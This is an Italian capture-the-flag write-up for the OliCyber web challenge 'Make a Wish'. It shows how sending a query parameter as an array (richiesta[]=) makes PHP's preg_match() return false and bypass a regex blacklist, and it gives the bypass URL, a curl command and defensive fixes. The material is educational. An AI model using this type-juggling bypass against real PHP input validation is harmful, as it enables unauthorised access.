# Make a Wish

**Competizione:** OliCyber<br>
**Categoria:** Web<br>
**URL:** http://make-a-wish.challs.olicyber.it

---

## Descrizione

> Ho creato la blacklist perfetta! Nessuno potrà bypassarla

Un sito che filtra le richieste con una regex, ma la blacklist può essere bypassata sfruttando il type juggling di PHP.

---

## Soluzione

### Step 1 — Analisi del codice sorgente

```php
<?php
  if(isset($_GET['richiesta'])) {
    if (preg_match("/.*/i", $_GET['richiesta'], $match)) {
      echo "No, mi dispiace non posso fare questo!";
    } else {
      echo "flag{TROVAMI}";
    }
  } else {
    echo "Fai una richiesta e provero a realizzarla";
  }
?>
```

Il flag viene stampato **solo** quando `preg_match()` restituisce `0` (nessun match).

La regex usata è `/.*/i`, che significa:

| Parte | Significato |
|---|---|
| `.` | Qualsiasi carattere eccetto newline |
| `*` | Zero o più volte |
| `i` | Case-insensitive |

A prima vista sembra impossibile da bypassare: `.*` matcha qualsiasi stringa, anche quella vuota.

---

### Step 2 — Identificazione della vulnerabilità

La vulnerabilità risiede nel comportamento di `preg_match()` quando riceve un **array** invece di una **stringa**:

- `preg_match()` restituisce **`false`** ed emette un warning
- Nel contesto `if(false)`, il ramo `else` viene eseguito
- La flag viene stampata

La regex `/.*/i` è effettivamente infallibile contro qualsiasi **stringa**. Il problema non è la regex in sé, ma il presupposto che `$_GET['richiesta']` sia sempre una stringa. In PHP questo non è garantito: un utente può inviare array tramite la sintassi `[]` nei parametri.

---

### Step 3 — Sfruttamento

Esattamente come nella challenge *C Style Login*, sfruttiamo il comportamento di PHP con i `[]` nel nome del parametro per inviare un array invece di una stringa.

```
richiesta=ciao    →   $_GET['richiesta'] = "ciao"   (stringa → preg_match matcha → NO flag)
richiesta[]=      →   $_GET['richiesta'] = []        (array   → preg_match false  → FLAG )
```

**Metodo 1 — URL nel browser:**

Visitare direttamente:

```
http://make-a-wish.challs.olicyber.it/?richiesta[]=
```

Non serve nemmeno Burp Suite, la sintassi `[]` funziona direttamente nell'URL.

**Metodo 2 — curl:**

```bash
curl "http://make-a-wish.challs.olicyber.it/?richiesta[]="
```

---

### Step 4 — Output

La risposta contiene la flag:

```
flag{...}
```

---

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | preg_match() Type Validation Bypass |
| **Causa** | preg_match() con array restituisce false |
| **Vettore** | Parametro GET con sintassi `[]` |
| **Impatto** | Bypass della regex blacklist |

---

## Conclusioni

- Validare il tipo dell'input prima di usarlo: `if (!is_string($_GET['richiesta']))`
- Usare `=== false` invece di valutazione implicita per controllare il ritorno di `preg_match()`
- Non fidarsi mai del tipo dei dati provenienti da `$_GET`, `$_POST`, `$_COOKIE`
- Una regex perfetta non protegge da input di tipo non valido
- La flessibilità dei tipi di PHP richiede validazione esplicita